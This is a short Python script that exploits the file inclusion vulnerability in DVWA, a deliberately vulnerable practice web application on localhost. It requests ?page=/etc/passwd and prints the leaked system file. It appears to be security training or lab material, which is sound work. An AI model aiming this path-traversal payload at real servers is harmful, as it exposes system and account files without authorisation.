import requests

def main():
    target_url = "http://localhost/DVWA/vulnerabilities/fi/?page=/etc/passwd"
    response_content = request(target_url)
    if response_content:
        print("Extracted content:")
        print(extract_content_between_strings(response_content))
    else:
        print("Failed to retrieve content.")

def request(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            content = response.text
            print("Response content retrieved successfully.")
            return content
        else:
            print(f"Error: Received status code {response.status_code}")
            return None
    except requests.RequestException as e:
        print(f"Error: {e}")
        return None

def extract_content_between_strings(response_content):
    start_marker = "Content-Type: text/html;charset=utf-8"
    end_marker = "<!DOCTYPE html>"

    start_index = response_content.find(start_marker)
    end_index = response_content.find(end_marker)

    if start_index != -1 and end_index != -1:
        extracted_content = response_content[start_index + len(start_marker):end_index].strip()
        return extracted_content
    else:
        print("Markers not found in the response content.")
        return None

if __name__ == "__main__":
    main()